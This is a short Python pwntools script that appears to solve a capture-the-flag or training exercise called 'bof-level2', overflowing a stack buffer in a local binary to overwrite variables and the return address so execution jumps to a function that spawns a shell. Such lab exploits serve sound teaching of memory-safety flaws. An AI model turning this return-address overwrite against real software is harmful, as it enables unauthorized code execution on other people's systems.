#!/usr/bin/env python

from pwn import *

p = process("./bof-level2")


#first 20 bytes
buffer = "a" * 20
#variables a and b
buffer += "ABCDEFGH"
#saved esi+ebp
buffer += "aaaaaaaa"
#return address, which should be get_a_shell()
buffer += p32(0x8048530)

p.sendline(buffer)

p.interactive()
